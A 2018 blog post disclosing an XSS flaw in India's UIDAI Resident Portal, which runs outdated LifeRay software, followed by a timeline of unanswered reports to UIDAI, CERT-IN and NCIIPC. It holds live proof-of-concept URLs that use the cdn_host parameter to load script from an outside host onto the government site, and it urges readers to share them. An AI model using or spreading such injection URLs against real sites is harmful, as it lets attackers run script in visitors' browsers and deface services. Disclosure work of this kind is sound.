---
title: Aadhaar Vulnerability Public Disclosure
layout: post
image: aadhaar1.jpg
tags:
    - aadhaar
    - disclosure
    - sanitarypanels
    - 13ftwalls
---

# The Vulnerability

The UIDAI Resident Portal (with read access to entire Aadhaar Demographic data) is runing a vulnerable version
of LifeRay software. It is running LifeRay 6.1, which was declared End-of-Life in Febrary 2016.

This release includes multiple known vulnerabilities, including:

1.  A XSS issue, for which a PoC can be found at [resident.uidai.gov.in](https://resident.uidai.gov.in/?cdn_host=https://scan.bb8.fun) (Picture Credits: [@sanitarypanels](https://twitter.com/sanitarypanels))
2.  Multiple RCEs: See [issue-62](https://dev.liferay.com/web/community-security-team/known-vulnerabilities/liferay-portal-62) for eg.

In fact the release is so old it does not even appear on the ["Known Vulnerabilities"](https://dev.liferay.com/web/community-security-team/known-vulnerabilities) page on the LifeRay website; you have to go look at their [Archived Vulnerabilities](https://dev.liferay.com/web/community-security-team/known-vulnerabilities/liferay-portal-62).

# The PoC

You can find a simple Proof of Concept for the XSS issue at [resident.uidai.gov.in](https://resident.uidai.gov.in/?cdn_host=https://scan.bb8.fun).

The `cdn_host` parameter injects javascript from `$CDN_HOST/Resident-theme/js/custom.js`, in this case `https://scan.bb8.fun/Resident-theme/js/custom.js` which hosts a small snippet to overwrite the HTML of the page.

It shows up like:

![](/img/aadhaar1.jpg)

# Fun

The current script allows for embeding any tweet using a `tweet` parameter. To embed:

Go to any tweet, copy the part after `twitter.com` and pass it as the `tweet` parameter. For eg, to embed this tweet:

<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">Breaking: Exclusive footage from inside <a href="https://twitter.com/UIDAI?ref_src=twsrc%5Etfw">@UIDAI</a>&#39;s IT department after media reports of Aadhaar data leaks. <a href="https://t.co/W7m9L0HvEX">pic.twitter.com/W7m9L0HvEX</a></p>&mdash; Aadhaar Compound Wall (@13footwall) <a href="https://twitter.com/13footwall/status/979301578686345216?ref_src=twsrc%5Etfw">March 29, 2018</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

1.  Look at the URL: `https://twitter.com/13footwall/status/979301578686345216`
2.  Copy `13footwall/status/979301578686345216` and pass it as the `tweet parameter`:
3.  The URL becomes`https://resident.uidai.gov.in/?cdn_host=https://scan.bb8.fun&tweet=13footwall/status/979301578686345216`
4.  [**SHARE IT**](https://resident.uidai.gov.in/?cdn_host=https://scan.bb8.fun&tweet=13footwall/status/979301578686345216)

# The Report

I initially reported this to `help@uidai.gov.in` in Jan 2017:

![](/img/aadhaar-report1.jpg)

Forgot all about it till Jan 2018, when someone mentioned I should try my luck with CERT-IN instead:

![](/img/aadhaar-report2.png)

# Update

There is [some confusion](https://twitter.com/kingslyj/status/1040985678408871937) regarding which version of LifeRay
is UIDAI running. They seem to be running 6.1.1, released in 2013-02-26.

The exact version is not relevant to the fact that UIDAI is:

-   running an unsupported release
-   which is 5 year old
-   not updating it despite being notified multiple times

# Timeline

This is still not fixed. Here is a complete timeline:

| Date        | What?                                                                                              |
| ----------- | -------------------------------------------------------------------------------------------------- |
| 16 Jan 2017 | Initially reported to `help@uidai.gov.in`. No response                                             |
| 21 Jan 2018 | Reported to `ceo@uidai.gov.in` and `info@cert-in.org.in`. No response                              |
| 19 Feb 2018 | Reminder sent to `ceo@uidai.gov.in` and `info@cert-in.org.in`                                      |
| 19 Feb 2018 | Acknowledgement from CERT                                                                          |
| 15 Mar 2018 | Reminder sent. No response                                                                         |
| 17 Mar 2018 | Notified [NCIIPC](rvdp@nciipc.gov.in)                                                              |
| 18 Mar 2018 | Confirmation from NCIIPC asking for more details. I replied back with a quote of previous exchange |
| 19 Mar 2018 | Confirmation from NCIIPC thanking me for the report.                                               |
| 19 Apr 2018 | Reminder sent to UIDAI asking for acknowledgement                                                  |
| 30 May 2018 | Reminder sent to NCIIPC and CERT asking for updates                                                |

The only change that I'm aware of since my initial report is that the website stopped declaring the [LifeRay version in a HTTP response Header](https://en.wikipedia.org/wiki/Security_through_obscurity).
